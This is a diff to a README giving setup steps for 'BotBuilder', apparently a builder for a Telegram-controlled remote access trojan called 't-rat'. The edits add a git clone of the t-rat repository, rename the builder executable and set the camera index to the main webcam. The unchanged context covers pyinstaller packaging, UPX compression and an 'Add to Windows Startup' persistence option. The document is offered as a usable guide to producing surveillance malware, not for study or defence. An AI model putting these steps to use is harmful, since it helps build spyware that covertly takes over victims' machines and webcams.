@@ -33,6 +33,10 @@ C:\Python311\python.exe --version
 mkdir BotBuilder
 cd BotBuilder
 
+# clone the code
+git clone https://github.com/adhilNuckz/t-rat.git
+
+cd t-rat
 # Create venv using Python 3.11
 C:\Python311\python.exe -m venv venv
 
@@ -54,7 +58,7 @@ pip install pyinstaller python-telegram-bot==13.15 pillow psutil opencv-python p
 ### Step 5: Run BotBuilder
 
 ```powershell
-cd BotBuilder
+
 .\BotBuilder.exe
 ```
 
@@ -66,7 +70,7 @@ Your final setup should look like:
 
 ```
 C:\BotBuilder\
-  ├── BotBuilder.exe           # Main application
+  ├── t-rat-builder-v1.0.exe           # Main application
   ├── telebot_lite.py          # Bot template
   ├── upx\                     # Compression tool
   │   ├── upx.exe
@@ -87,7 +91,7 @@ C:\BotBuilder\
 2. Enter:
    - **Bot Name**: MyBot
    - **Bot Token**: (from @BotFather)
-   - **Camera Index**: 1
+   - **Camera Index**: 0 for main  webcam
    - ✅ Check "Add to Windows Startup" (optional)
 3. Click **Build Bot Executable**
 4. Wait 2-3 minutes
